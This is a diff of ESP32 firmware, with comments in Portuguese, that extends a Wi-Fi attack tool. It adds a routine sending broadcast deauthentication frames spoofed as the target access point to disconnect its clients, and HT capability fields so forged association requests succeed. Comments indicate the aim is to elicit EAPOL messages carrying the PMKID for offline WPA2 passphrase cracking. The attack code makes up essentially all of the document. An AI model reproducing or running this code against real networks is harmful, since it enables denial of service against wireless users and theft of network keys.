@@ -87,6 +87,10 @@ public:
                         esp_fill_random(_fakeMac, 6);
                         _fakeMac[0] = (_fakeMac[0] | 0x02) & 0xFE;
                         esp_wifi_set_channel(t.channel, WIFI_SECOND_CHAN_NONE);
+                        // Deauth broadcast para forçar clientes a re-associar
+                        // Aumenta chances do AP processar nosso Auth logo em seguida
+                        _sendDeauthBroadcast(t.bssid);
+                        delayMicroseconds(500);
                         _sendAuthRequest(t.bssid, _fakeMac);
                         _ss = SS_WAIT_AUTH;
                         _ssTimer = now;
@@ -145,6 +149,18 @@ private:
     size_t        _curIdx  = 0;
     uint8_t       _fakeMac[6] = {};
 
+    void _sendDeauthBroadcast(const uint8_t* ap) {
+        const uint8_t bcast[6] = {0xFF,0xFF,0xFF,0xFF,0xFF,0xFF};
+        uint8_t f[26] = {};
+        f[0] = 0xC0; f[1] = 0x00;   // Deauth
+        f[2] = 0x3A; f[3] = 0x01;
+        memcpy(f+4,  bcast, 6);       // DA = broadcast
+        memcpy(f+10, ap,    6);       // SA = AP (spoofado)
+        memcpy(f+16, ap,    6);       // BSSID = AP
+        f[24] = 0x03; f[25] = 0x00;  // reason: deauth leaving
+        for (int i = 0; i < 3; i++) esp_wifi_80211_tx(WIFI_IF_AP, f, 26, false);
+    }
+
     void _sendAuthRequest(const uint8_t* ap, const uint8_t* sta) {
         uint8_t f[30] = {};
         f[0] = 0xB0; f[1] = 0x00;  // Auth Request
@@ -188,6 +204,18 @@ private:
         // Extended Supported Rates
         static const uint8_t extRates[] = {0x32,0x04,0x30,0x48,0x60,0x6C};
         memcpy(buf + pos, extRates, sizeof(extRates)); pos += sizeof(extRates);
+
+        // HT Capabilities IE — necessário para APs 802.11n não recusarem a assoc
+        static const uint8_t htcap[] = {
+            0x2D, 0x1A,             // tag=45, len=26
+            0xEF, 0x09,             // HT Capability Info
+            0x1B,                   // A-MPDU params
+            0xFF,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00, // MCS set
+            0x00,0x00,              // HT Extended Caps
+            0x00,0x00,0x00,0x00,    // TX Beamforming
+            0x00,                   // ASEL Caps
+        };
+        memcpy(buf + pos, htcap, sizeof(htcap)); pos += sizeof(htcap);
 
         // RSN IE (WPA2-PSK CCMP) — essencial para AP enviar EAPOL M1 com PMKID
         // PMKIDCount=0 obrigatório: APs Cisco/Mikrotik rejeitam sem este campo
